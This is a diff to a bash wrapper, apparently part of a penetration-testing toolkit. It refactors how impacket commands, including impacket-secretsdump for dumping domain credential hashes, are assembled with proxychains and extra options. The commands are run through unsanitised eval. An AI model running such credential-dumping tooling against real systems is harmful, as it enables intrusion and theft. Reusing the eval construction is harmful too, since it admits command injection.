@@ -87,13 +87,19 @@ run_impacket() {
         fi
         run_cmd_option=$(echo "$run_cmd_option" | sed 's/"/\\"/g')
     fi
+    if [[ -z $impacket_additional_options ]]; then
+        echo "No additional options set for impacket."
+    else
+        echo "impacket_additional_options=$impacket_additional_options"
+    fi
     echo "target=$target"
-    echo ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target "$run_cmd_option"
+    local command_string="${proxychain_command}$impacket_command $impacket_command_options $impacket_additional_options -no-pass $target"
+    echo $command_string
     if [[ -z $run_cmd_option ]]; then
-        eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target | tee -a $trail_log
+        eval $command_string | tee -a $trail_log
     else
         #echo ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" 
-        eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" | tee -a $trail_log
+        eval $command_string \"$run_cmd_option\"  | tee -a $trail_log
     fi
 }
 
@@ -102,14 +108,13 @@ run_impacket_secretsdump () {
     if [[ -z "$hash_file" ]]; then
         hash_file="hashes.secretsdump"
     fi
-    local target_username_option=""
     if [[ -z "$target_username" ]]; then
         echo "Target username was not set. Assuming just-dc-user was not needed"
     else
-        target_username_option="-just-dc-user $target_username"
+        secretsdump_additional_options="-just-dc-user $target_username"
     fi
     output_hashes="true"
-    run_impacket "impacket-secretsdump" "$target_username_option"
+    run_impacket "impacket-secretsdump" "$secretsdump_additional_options"
 
 }
 
